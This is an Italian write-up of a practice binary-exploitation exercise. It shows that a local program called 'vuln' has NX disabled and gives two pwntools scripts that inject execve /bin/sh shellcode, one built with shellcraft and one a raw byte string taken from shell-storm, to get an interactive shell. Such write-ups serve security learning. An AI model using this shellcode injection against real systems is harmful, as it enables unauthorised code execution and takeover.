# Flag
Not a CTF (basta accedere alla bash)

# Write-up
1. Analizzando il codice, possiamo vedere che l'unica cosa presente è un input
2. Eseguendo uno script Python per visualizzare elf.symbols, possiamo vedere che NX è disabilitato (quindi possiamo injectare dei byte per aprire la shellcode) (possiamo vedere i controlli anche mediante il comando ``checksec`` per GEF)
3. Abbiamo due modi per injectare shellcode <br>
    ```python
    from pwn import *

    with process("./vuln") as r:
        inp=asm(shellcraft.sh())
        r.sendline(inp)
        r.interactive()
    ```
4. Oppure
    ```python
    from pwn import *

    with process("./vuln") as r:
        inp='\x31\xc9\xf7\xe9\x51\x04\x0b\xeb\x08\x5e\x87\xe6\x99\x87\xdc\xcd\x80\xe8\xf3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x2f\x73\x68'
        #La sequenza è stata presa dal sito che riportiamo alla fine della spiegazione
        r.sendline(inp)
        r.interactive()
    ```
5. Eseguire uno dei due script e si avrà la possibilità di navigare tramite la bash

<hr>

[Shellcode](http://shell-storm.org/shellcode/index.html)<br>
[Linux/x86 obfuscated execv /bin/sh by Russell Willis](http://shell-storm.org/shellcode/files/shellcode-851.html)
